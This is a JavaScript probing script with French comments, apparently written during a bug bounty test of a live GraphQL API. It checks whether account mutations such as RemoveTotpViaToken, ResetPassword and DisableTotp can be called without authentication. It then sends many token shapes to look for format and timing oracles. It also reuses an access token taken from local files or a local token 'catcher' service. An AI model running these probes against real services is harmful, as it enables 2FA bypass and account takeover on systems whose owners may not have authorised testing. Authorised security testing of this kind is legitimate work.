// P2 methode 3a (Kimi) : oracle de format sur les mutations a token, SANS authentification d'abord.
// Question 1 : removeTotpViaToken est-elle appelable sans jeton ? (Kimi le suppose)
// Question 2 : l API valide-t-elle la forme (longueur/charset) avant de verifier l existence ?
//              -> un message d erreur distinct par forme = oracle de format
// Question 3 : oracle temporel (forme valide vs forme invalide) ?
import fs from "fs";
const EP = "https://bugsecure-api.senintel.sn/graphql";
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
const ALL = fs.readFileSync("/tmp/opencode/allops.txt", "utf8");
const blocks = ALL.split(/^######## /m).slice(1);
const OPS = {};
for (const b of blocks) {
  const nl = b.indexOf("\n");
  OPS[b.slice(0, nl).trim()] = b.slice(nl + 1).trim();
}
async function call(text, variables, auth) {
  const t0 = Date.now();
  const r = await fetch(EP, { method: "POST", headers: { "Content-Type": "application/json", ...(auth ? { Authorization: "Bearer " + auth } : {}) }, body: JSON.stringify({ query: text, variables }) });
  const txt = await r.text();
  let j = null; try { j = JSON.parse(txt); } catch {}
  return { ms: Date.now() - t0, s: r.status, j, txt };
}
const brief = (r) => {
  const e = r.j?.errors ? r.j.errors.map((x) => x.message).join(" | ") : JSON.stringify(r.j?.data);
  return e.slice(0, 150);
};

const WANT = ["RemoveTotpViaToken", "VerifyEmail", "VerifyEmailChange", "ConfirmEmailChange", "ResetPassword", "AcceptOrganizationInvitation", "ExchangeCliSignInCode", "CreateCliSignInCode", "DisableTotp", "GenerateBackupCodes", "GenerateTotpSecret", "Verify2fa", "ChangePassword", "ForgotPassword"];
console.log("=== 1) quelles mutations a token existent et sont-elles accessibles SANS jeton ? ===\n");
for (const name of WANT) {
  const text = OPS[name];
  if (!text) { console.log("  " + name.padEnd(30) + "(op absente du corpus)"); continue; }
  // on construit des variables generiques : le premier argument de type String/ID vaut "bb-test"
  const vars = {};
  const vnames = [...text.matchAll(/\$(\w+)\s*:\s*(\w+[!\w]*)/g)].map((m) => m[1]);
  for (const v of vnames) vars[v] = "bb-test";
  const r = await call(text, vars, null);
  console.log("  " + name.padEnd(30) + "HTTP " + r.s + " " + brief(r));
  await sleep(600);
}

console.log("\n=== 2) RemoveTotpViaToken : oracle de format (plusieurs formes de token) ===");
const rt = OPS["RemoveTotpViaToken"];
console.log("  requete: " + (rt || "").replace(/\s+/g, " ").slice(0, 160) + "\n");
const SHAPES = [
  ["vide", ""],
  ["1 lettre", "A"],
  ["6 chiffres", "123456"],
  ["8 chiffres", "12345678"],
  ["10 chiffres", "1234567890"],
  ["16 hex", "0123456789abcdef"],
  ["32 hex", "0".repeat(32)],
  ["64 hex", "0".repeat(64)],
  ["64 hex non-repeated", "0123456789abcdef".repeat(4)],
  ["64 'g' (hors hex)", "g".repeat(64)],
  ["64 majuscules", "A".repeat(64)],
  ["base64url 43", "A".repeat(43)],
  ["JWT a.b.c", "aaaa.bbbb.cccc"],
  ["UUID", "3f2504e0-4f89-11d3-9a0c-0305e82c3301"],
  ["with spaces", "aaa aaa"],
  ["long random 200", "x".repeat(200)],
];
for (const [lbl, tok] of SHAPES) {
  const vars = {};
  for (const v of [...rt.matchAll(/\$(\w+)\s*:\s*(\w+[!\w]*)/g)].map((m) => m[1])) vars[v] = tok;
  const r = await call(rt, vars, null);
  console.log("  token[" + lbl.padEnd(20) + "] " + String(r.ms).padStart(5) + "ms  HTTP " + r.s + "  " + brief(r));
  await sleep(500);
}

console.log("\n=== 3) meme chose, mais avec un jeton d acces valide (le comportement peut differer) ===");
let AT = "";
try { AT = fs.readFileSync("/tmp/opencode/session-at.txt", "utf8").trim(); } catch {}
try { if (!AT) AT = fs.readFileSync("/tmp/opencode/catcher-at-https_bugsecure_api_senintel_sn.txt", "utf8").trim(); } catch {}
if (!AT) {
  // tente un refresh via le catcher
  try {
    const r = await fetch("http://127.0.0.1:53682/token?resource=" + encodeURIComponent("https://bugsecure-api.senintel.sn"));
    const j = await r.json();
    AT = j.access_token || "";
    if (AT) console.log("  (jeton obtenu du catcher)");
  } catch {}
}
if (!AT) console.log("  pas de jeton disponible -> section 3 ignoree (le RT a ete consume par un test de diagnostic)");
else {
  console.log("  audience du jeton: " + (JSON.parse(Buffer.from(AT.split(".")[1], "base64url").toString()).aud));
  for (const [lbl, tok] of SHAPES) {
    const vars = {};
    for (const v of [...rt.matchAll(/\$(\w+)\s*:\s*(\w+[!\w]*)/g)].map((m) => m[1])) vars[v] = tok;
    const r = await call(rt, vars, AT);
    console.log("  token[" + lbl.padEnd(20) + "] " + String(r.ms).padStart(5) + "ms  HTTP " + r.s + "  " + brief(r));
    await sleep(500);
  }
}
